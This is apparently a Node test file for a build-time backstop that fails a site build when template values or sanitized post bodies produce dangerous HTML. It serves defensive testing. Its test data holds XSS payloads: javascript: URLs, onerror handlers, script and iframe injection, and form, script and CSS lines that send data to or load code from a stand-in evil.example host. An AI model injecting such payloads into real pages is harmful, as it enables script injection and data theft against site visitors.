// The build-time backstop. Its job is to catch a template-engine misclassification
// NOBODY HAS FOUND YET — so the tests that matter are the ones proving it fires on
// danger that reaches the output by any route, and stays silent on author markup.
//
// Two properties, and the second is the one that decides whether this can ship:
//   1. a value that produces dangerous markup fails the build
//   2. author-written markup that is dangerous-looking does NOT, ever
// A false positive here brings down a tenant's deploy, so (2) is not optional.
import { test } from "node:test";
import assert from "node:assert/strict";
import { renderChecked } from "../../frontend/lib/assert-rendered-safe.ts";

const throws = (tpl, data, why) =>
  assert.throws(() => renderChecked(tpl, data), /Unsafe value rendered/, why);

test("author markup that looks dangerous is never flagged", () => {
  // Every one of these is written by the template author, who is trusted. Flagging any
  // would fail a tenant's deploy for no reason — the failure mode that would make this
  // check unshippable.
  const ok = [
    [`<button onclick="doThing()">go</button>`, {}],
    [`<a href="javascript:void(0)" onclick="x()">x</a>`, {}],
    [`<script>var a = 1 < 2; alert(a);</script>`, {}],
    [`<style>.a{background:url(/img/x.png)}</style>`, {}],
    [`<base href="https://cdn.example/">`, {}],
    [`<meta http-equiv="refresh" content="0;url=/next">`, {}],
    [`<iframe srcdoc="<p>hi</p>"></iframe>`, {}],
    // …and the same templates WITH ordinary values interpolated elsewhere.
    [`<button onclick="doThing()">{{label}}</button>`, { label: "Go" }],
    [`<a href="/blog/{{slug}}" onclick="track()">x</a>`, { slug: "p1" }],
    [`<script>var v = 1;</script><a href="{{u}}">x</a>`, { u: "https://ok.example" }],
  ];
  for (const [tpl, data] of ok) {
    assert.doesNotThrow(() => renderChecked(tpl, data), `must not flag author markup: ${tpl}`);
  }
});

test("legitimate values still render and are returned", () => {
  assert.equal(renderChecked(`<a href="{{u}}">x</a>`, { u: "/about" }), `<a href="/about">x</a>`);
  assert.equal(renderChecked(`<a href="/blog/{{s}}">x</a>`, { s: "p1" }), `<a href="/blog/p1">x</a>`);
  assert.ok(renderChecked(`<ul>{{#each xs}}<li>{{n}}</li>{{/each}}</ul>`, { xs: [{ n: "a" }, { n: "b" }] }).includes("<li>a</li>"));
  assert.ok(renderChecked(`{{#if on}}<a href="{{u}}">x</a>{{/if}}`, { on: true, u: "/ok" }).includes('href="/ok"'));
});

test("it fires on danger introduced by a VALUE, whatever the engine did", () => {
  // The engine currently neutralises all of these, so to prove the backstop works
  // independently we hand it markup where the dangerous construct reaches the output.
  // `{{{raw}}}` in a text position is emitted verbatim BY DESIGN — which makes it the
  // honest stand-in for "the engine misclassified something".
  throws(`<div>{{{body}}}</div>`, { body: `<a href="javascript:alert(1)">x</a>` }, "js URL via raw");
  throws(`<div>{{{body}}}</div>`, { body: `<img src=x onerror=alert(1)>` }, "handler via raw");
  throws(`<div>{{{body}}}</div>`, { body: `<iframe srcdoc="<script>alert(1)</script>"></iframe>` }, "srcdoc via raw");
  throws(`<div>{{{body}}}</div>`, { body: `<base href="https://evil.example/">` }, "base via raw");
  throws(`<div>{{{body}}}</div>`, { body: `<script>alert(1)</script>` }, "script text via raw");
  throws(`<div>{{{body}}}</div>`, { body: `<meta http-equiv=refresh content="0;url=//evil">` }, "refresh via raw");
  throws(`<div>{{{body}}}</div>`, { body: `<div style="background:url(//evil/leak)">x</div>` }, "css exfil via raw");
});

test("the control render keeps block SHAPE, or the diff would be meaningless", () => {
  // The control replaces values but must take the same {{#if}}/{{#each}} branches —
  // otherwise it renders different markup and every construct looks "introduced".
  assert.doesNotThrow(() =>
    renderChecked(`{{#if on}}<button onclick="go()">{{label}}</button>{{/if}}`, { on: true, label: "x" }),
  );
  assert.doesNotThrow(() =>
    renderChecked(`{{#each xs}}<a href="/p/{{s}}" onclick="t()">{{s}}</a>{{/each}}`, { xs: [{ s: "a" }, { s: "b" }] }),
  );
  // …and danger inside a block body is still caught.
  throws(`{{#if on}}<div>{{{b}}}</div>{{/if}}`, { on: true, b: `<a href="javascript:alert(1)">x</a>` });
});

test("the error names the construct, so the report is actionable", () => {
  try {
    renderChecked(`<div>{{{b}}}</div>`, { b: `<a href="javascript:alert(1)">x</a>` }, "templates/x/template.html");
    assert.fail("should have thrown");
  } catch (e) {
    assert.match(e.message, /templates\/x\/template\.html/);
    assert.match(e.message, /javascript:alert\(1\)/);
    assert.match(e.message, /template-render\.ts/, "should point at the real culprit");
  }
});

test("an element that loads code or sends data is caught even with a valid https URL", () => {
  // A URL allowlist cannot catch these — https is a perfectly good scheme. The finding
  // is that the ELEMENT exists because of a value. Safe to flag broadly only because
  // it is diffed against the control render (see the author-markup test above).
  for (const body of [
    `<script src="https://evil.example/x.js"></script>`,
    `<iframe src="https://evil.example/x"></iframe>`,
    `<object data="https://evil.example/x"></object>`,
    `<embed src="https://evil.example/x">`,
    `<form action="https://evil.example/steal"><input name=p></form>`,
    `<link rel="stylesheet" href="https://evil.example/x.css">`,
    `<svg><use href="https://evil.example/x#i"/></svg>`,
  ]) {
    throws(`<div>{{{b}}}</div>`, { b: body }, body);
  }
  // The author's own equivalents are untouched — they appear in both renders.
  for (const tpl of [
    `<script src="https://cdn.example/a.js"></script>`,
    `<iframe src="https://youtube.com/embed/x"></iframe>`,
    `<form action="https://forms.example/s"><input name=e></form>`,
    `<link rel="stylesheet" href="https://fonts.googleapis.com/x">`,
  ]) {
    assert.doesNotThrow(() => renderChecked(tpl, {}), tpl);
  }
});

test("hostile data cannot switch the check off", () => {
  // An earlier version wrapped the control render in try/catch and returned the real
  // HTML unchecked on failure — so a getter that throws on its second read disabled
  // the check entirely and shipped the XSS. Any failure here must fail the build.
  let reads = 0;
  const data = {
    get b() {
      if (reads++ > 0) throw new Error("boom");
      return `<a href="javascript:alert(1)">x</a>`;
    },
  };
  assert.throws(() => renderChecked(`<div>{{{b}}}</div>`, data), /boom|Unsafe value rendered/);
});

// ── The other set:html sink: sanitized post/page bodies ─────────────────────
// Bodies are attacker-reachable (the Telegram bot commits raw HTML; an MCP agent
// writes them) and DOMPurify being correct is their only defence. Same reasoning as
// the template backstop: verify the OUTPUT rather than trust the transform, so a
// config regression or an mXSS gadget fails the build instead of shipping.

test("a sanitizer failure fails the build", async () => {
  const { assertSanitizedSafe } = await import("../../frontend/lib/assert-rendered-safe.ts");
  for (const bad of [
    `<a href="javascript:alert(1)">x</a>`,
    `<img src=x onerror=alert(1)>`,
    `<script>alert(1)</script>`,
    `<style>@import url(//evil)</style>`,
    `<base href="https://evil.example/">`,
    `<meta http-equiv="refresh" content="0;url=//evil">`,
    `<iframe srcdoc="<script>alert(1)</script>"></iframe>`,
    `<object data="//evil/x"></object>`,
    `<form action="//evil/steal"><input name=p></form>`,
    `<a href="data:text/html,<script>alert(1)</script>">x</a>`,
  ]) {
    assert.throws(
      () => assertSanitizedSafe(bad, "post body"),
      /still contains markup a browser would act on/,
      bad,
    );
  }
});

test("ordinary sanitized content builds — including the embeds sanitize allows", async () => {
  const { assertSanitizedSafe } = await import("../../frontend/lib/assert-rendered-safe.ts");
  const { sanitizeBody } = await import("../../frontend/lib/sanitize.ts");
  for (const good of [
    `<p>Hello <strong>world</strong>, see <a href="/about">about</a>.</p>`,
    `<p><a href="https://example.com/x?a=1&b=2">link</a></p>`,
    `<figure><img src="/images/uploads/p.jpg" alt="a > b"></figure>`,
    `<blockquote cite="https://example.com/src">q</blockquote>`,
    // sanitize.ts deliberately ADD_TAGS an iframe for embeds and forces a sandbox —
    // flagging it would fail builds on ordinary posts.
    `<iframe src="https://www.youtube.com/embed/xyz" allowfullscreen></iframe>`,
    `<ul><li>a</li><li>b</li></ul><h2>Heading</h2>`,
  ]) {
    assert.doesNotThrow(() => assertSanitizedSafe(sanitizeBody(good), "post body"), good);
  }
  // And the real pipeline: a hostile body sanitizes clean, so the assertion passes.
  assert.doesNotThrow(() =>
    assertSanitizedSafe(sanitizeBody(`<img src=x onerror=alert(1)><a href="javascript:alert(1)">x</a>`), "post body"),
  );
});
